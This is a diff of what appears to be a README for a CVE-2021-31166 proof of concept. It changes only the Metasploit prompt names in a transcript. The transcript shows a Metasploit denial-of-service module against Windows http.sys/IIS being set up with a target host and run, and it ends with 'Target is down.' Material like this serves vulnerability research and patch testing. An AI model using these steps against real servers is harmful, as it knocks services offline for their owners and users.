@@ -76,8 +76,8 @@ Metasploit tip: You can use help to view all
 available commands
 
 [*] Starting persistent handler(s)...
-msf6 payload(windows/x64/meterpreter/reverse_tcp) > use auxiliary/dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166
-msf6 auxiliary(dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166) > show options
+msf payload(windows/x64/meterpreter/reverse_tcp) > use auxiliary/dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166
+msf auxiliary(dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166) > show options
 Module options (auxiliary/dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166):
 
    Name       Current Setting  Required  Description
@@ -91,9 +91,9 @@ Module options (auxiliary/dos/windows/http/http_sys_accept_encoding_dos_cve_2021
    TARGETURI  /                yes       The URI of the IIS Server.
    VHOST                       no        HTTP server virtual host
 
-msf6 auxiliary(dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166) > set RHOSTS 172.22.216.145
+msf auxiliary(dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166) > set RHOSTS 172.22.216.145
 RHOSTS => 172.22.216.145
-msf6 auxiliary(dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166) > exploit
+msf auxiliary(dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166) > exploit
 [*] Running module against 172.22.216.145
 
 [*] Connecting to target to make sure its alive...
@@ -102,7 +102,7 @@ msf6 auxiliary(dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166) > e
 [*] Checking that the server is down...
 [+] Target is down.
 [*] Auxiliary module execution completed
-msf6 auxiliary(dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166) >
+msf auxiliary(dos/windows/http/http_sys_accept_encoding_dos_cve_2021_31166) >
 ```
 
 ![Metasploit demonstration](https://mauricelambert.github.io/vulnerability/images/CVE-2021-31166_demo.gif "Metasploit demonstration")
